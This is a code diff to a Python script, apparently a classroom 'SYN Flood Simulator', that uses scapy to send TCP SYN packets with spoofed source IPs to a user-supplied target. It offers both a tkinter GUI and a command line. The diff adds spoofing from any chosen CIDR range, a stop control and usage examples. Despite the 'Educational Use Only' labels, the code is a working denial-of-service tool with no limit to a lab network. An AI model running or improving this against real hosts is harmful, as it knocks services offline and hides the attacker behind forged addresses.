@@ -1,12 +1,23 @@
 import sys
 import time
 import random
+import threading
+import ipaddress
 from scapy.all import *
 import tkinter as tk
 from tkinter import ttk, messagebox
 
+def resolveSourceIP(source):
+    source = source.strip()
+    if "/" in source:
+        hosts = list(ipaddress.IPv4Network(source, strict=False).hosts())
+        return str(random.choice(hosts))
+    return source
+
 def guiFunction():
-    def synFlood(destIP, destPort, packetCount, delay=0.1, outputText=None):
+    stopEvent = threading.Event()
+
+    def synFlood(destIP, destPort, packetCount, delay=0.1, outputText=None, srcTemplate="192.168.x.x"):
         if outputText:
             outputText.insert(tk.END, "[+] Starting SYN Flood Simulation (Educational Use Only)\n")
             outputText.insert(tk.END, f"[+] Target: {destIP}:{destPort}\n")
@@ -18,7 +29,16 @@ def guiFunction():
             print(f"[+] Sending {packetCount} packets with {delay}s delay\n")
 
         for i in range(1, packetCount + 1):
-            srcIP = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
+            if stopEvent.is_set():
+                msg = "\n[✗] Simulation Stopped by User\n"
+                if outputText:
+                    outputText.insert(tk.END, msg)
+                    outputText.see(tk.END)
+                else:
+                    print(msg)
+                return
+
+            srcIP = resolveSourceIP(srcTemplate)
             packet = IP(src=srcIP, dst=destIP) / TCP(sport=RandShort(), dport=destPort, flags="S")
 
             try:
@@ -60,48 +80,64 @@ def guiFunction():
             messagebox.showerror("Error", "Please enter a Destination IP address.")
             return
 
-        runButton.config(state=tk.DISABLED)
-        
+        srcTemplate = srcEntry.get().strip() or "192.168.x.x"
+
+        stopEvent.clear()
         outputText.delete(1.0, tk.END)
-        
-        import threading
-        thread = threading.Thread(target=synFlood, args=(destIP, destPort, packetCount, delay, outputText))
+        runButton.config(state=tk.DISABLED)
+        stopButton.config(state=tk.NORMAL)
+
+        thread = threading.Thread(target=synFlood, args=(destIP, destPort, packetCount, delay, outputText, srcTemplate), daemon=True)
         thread.start()
-        
-        root.after(5000, lambda: runButton.config(state=tk.NORMAL)) 
+
+        def checkDone():
+            if thread.is_alive():
+                root.after(200, checkDone)
+            else:
+                runButton.config(state=tk.NORMAL)
+                stopButton.config(state=tk.DISABLED)
+
+        root.after(200, checkDone)
+
+    def stopSimulation():
+        stopEvent.set()
+        stopButton.config(state=tk.DISABLED)
 
     def showHelp():
-        helpText = """
-        SYN Flood Simulator (Educational Use Only)
+        helpText = """SYN Flood Simulator (Educational Use Only)
 
-        This tool simulates a SYN flood attack for educational purposes.
-        It sends a specified number of SYN packets to a target IP address and port.
+GUI Usage:
+  1. Enter Destination IP and Port of the target.
+  2. Enter Packet Count and Delay between packets.
+  3. Enter Source IP (e.g. 192.168.1.5) or a CIDR network
+     (e.g. 192.168.0.0/24) for random spoofed sources.
+  4. Click 'Start Simulation' to begin, 'Stop' to abort.
 
-        Usage:
-        1. Enter the Destination IP address of the target.
-        2. Enter the Destination Port number.
-        3. Enter the number of Packets you want to send.
-        4. Optionally, adjust the Delay (in seconds) between sending each packet.
-        5. Click 'Start Simulation' to begin.
+CLI Usage:
+  sudo python ddos-attack-app.py <destIP> <destPort> <packetCount> [srcIP/Network]
+  Example: sudo python ddos-attack-app.py 192.168.8.40 80 30 192.168.0.0/24
 
-        The output of the simulation will be displayed in the 'Output' area below.
-
-        WARNING: This tool should only be used in controlled, educational environments
-        where you have explicit permission to conduct such tests. Unauthorized use
-        is illegal and unethical.
-
-        Created by Kaled Aljebur for learning purposes in teaching classes.
-        """
-        
+WARNING: For controlled educational environments only.
+Unauthorized use is illegal and unethical.
+Created for learning purposes in teaching classes.
+https://github.com/kaledaljebur/ddos
+"""
         top = tk.Toplevel(root)
         top.title("Help")
-        helpLabel = tk.Label(top, text=helpText, justify=tk.LEFT, padx=10, pady=10)
-        helpLabel.pack(padx=10, pady=10)
+        top.geometry("750x360")
+        textFrame = ttk.Frame(top)
+        textFrame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        scrollbar = ttk.Scrollbar(textFrame)
+        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+        helpText_widget = tk.Text(textFrame, wrap=tk.WORD, padx=8, pady=8, yscrollcommand=scrollbar.set)
+        helpText_widget.insert(tk.END, helpText)
+        helpText_widget.config(state=tk.DISABLED)
+        helpText_widget.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        scrollbar.config(command=helpText_widget.yview)
         closeButton = ttk.Button(top, text="Close", command=top.destroy)
         closeButton.pack(pady=5)
 
     print("Please follow the GUI window.")
-    print("Created by Kaled Aljebur for learning purposes in teaching clases.")
     root = tk.Tk()
     root.title("SYN Flood Simulator (Educational)")
 
@@ -132,20 +168,30 @@ def guiFunction():
     delayLabel.grid(column=0, row=3, sticky=tk.W)
     delayEntry = ttk.Entry(mainFrame)
     delayEntry.grid(column=1, row=3, sticky=(tk.W, tk.E))
-    delayEntry.insert(0, "0.1") 
+    delayEntry.insert(0, "0.1")
 
-    runButton = ttk.Button(mainFrame, text="Start Simulation", command=runSimulation)
-    runButton.grid(column=0, row=4, columnspan=2, pady=10)
-    
+    srcLabel = ttk.Label(mainFrame, text="Source IP / Network:")
+    srcLabel.grid(column=0, row=4, sticky=tk.W)
+    srcEntry = ttk.Entry(mainFrame)
+    srcEntry.grid(column=1, row=4, sticky=(tk.W, tk.E))
+    srcEntry.insert(0, "192.168.0.0/24")
+
+    buttonFrame = ttk.Frame(mainFrame)
+    buttonFrame.grid(column=0, row=5, columnspan=2, pady=10)
+    runButton = ttk.Button(buttonFrame, text="Start Simulation", command=runSimulation)
+    runButton.pack(side=tk.LEFT, padx=5)
+    stopButton = ttk.Button(buttonFrame, text="Stop", command=stopSimulation, state=tk.DISABLED)
+    stopButton.pack(side=tk.LEFT, padx=5)
+
     helpButton = ttk.Button(mainFrame, text="Help", command=showHelp)
-    helpButton.grid(column=0, row=5, columnspan=2, pady=5)
-    
+    helpButton.grid(column=0, row=6, columnspan=2, pady=5)
+
     outputLabel = ttk.Label(mainFrame, text="Output:")
-    outputLabel.grid(column=0, row=5, sticky=tk.W)
+    outputLabel.grid(column=0, row=7, sticky=tk.W)
     outputText = tk.Text(mainFrame, height=10, width=40)
-    outputText.grid(column=0, row=6, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S))
+    outputText.grid(column=0, row=8, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S))
     outputScrollbar = ttk.Scrollbar(mainFrame, command=outputText.yview)
-    outputScrollbar.grid(column=2, row=6, sticky=(tk.N, tk.S))
+    outputScrollbar.grid(column=2, row=8, sticky=(tk.N, tk.S))
     outputText.config(yscrollcommand=outputScrollbar.set)
     
     for child in mainFrame.winfo_children():
@@ -154,15 +200,16 @@ def guiFunction():
     root.mainloop()
 
 def arguFunction():
-    def synFloodArgu(destIP, destPort, packetCount, delay=0.1):
+    def synFloodArgu(destIP, destPort, packetCount, srcTemplate="192.168.0.0/24", delay=0.1):
         print(f"[+] Starting SYN Flood Simulation (Educational Use Only)")
         print(f"[+] Target: {destIP}:{destPort}")
+        print(f"[+] Source: {srcTemplate}")
         print(f"[+] Sending {packetCount} packets with {delay}s delay\n")
-        
+
         for i in range(1, packetCount + 1):
-            srcIP = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
+            srcIP = resolveSourceIP(srcTemplate)
             packet = IP(src=srcIP, dst=destIP) / TCP(sport=RandShort(), dport=destPort, flags="S")
-            
+
             try:
                 send(packet, verbose=0)
                 print(f"[→] Packet {i}: {srcIP} → {destIP}:{destPort} (SYN)")
@@ -170,34 +217,35 @@ def arguFunction():
             except Exception as e:
                 print(f"[!] Error: {e}")
                 break
-        
+
         print("\n[✓] Simulation Complete")
 
-    # print("Example: sudo python ddos-attack.py 192.168.8.40 80 30.")
     destIP = sys.argv[1]
     destPort = int(sys.argv[2])
     packetCount = int(sys.argv[3])
-    
-    synFloodArgu(destIP, destPort, packetCount, delay=0.1)
+    srcTemplate = sys.argv[4] if len(sys.argv) == 5 else "192.168.0.0/24"
+
+    synFloodArgu(destIP, destPort, packetCount, srcTemplate, delay=0.1)
 
 def helpMenu():
     helpText2 = """
-    Created by Kaled Aljebur for learning purposes in teaching classes.
-    Usage 1 for GUI window: sudo python ddos-attack.py.
-    Usage 2 for terminal only: sudo python ddos-attack.py <destIP> <destPort> <packetCount>.
-    Example: sudo python ddos-attack.py 192.168.8.40 80 30.
+    Usage (GUI):      sudo python ddos-attack-app.py
+    Usage (CLI):      sudo python ddos-attack-app.py <destIP> <destPort> <packetCount> [srcIP/Network]
+    Example (basic):  sudo python ddos-attack-app.py 192.168.8.40 80 30
+    Example (source): sudo python ddos-attack-app.py 192.168.8.40 80 30 10.0.0.0/24
 
-    To see the traffic, use Wireshark with `tcp.port == 80` filter, or whatever port used in the command.    
-    Make sure the service is running and not blocked by firewall in the target, 
-    otherwise you will not see [SYN, ACK] flag in Wireshark.
+    srcIP/Network: a single IP or CIDR range (e.g. 192.168.1.5 or 192.168.0.0/24).
+                   Defaults to 192.168.0.0/24 if omitted.
+
+    https://github.com/kaledaljebur/ddos
     """
     print(helpText2)
-    sys.exit(1) 
+    sys.exit(1)
 
 if __name__ == "__main__":
     if len(sys.argv) == 1:
         guiFunction()
-    elif len(sys.argv) == 4:
+    elif len(sys.argv) in (4, 5):
         arguFunction()
     else:
         helpMenu()
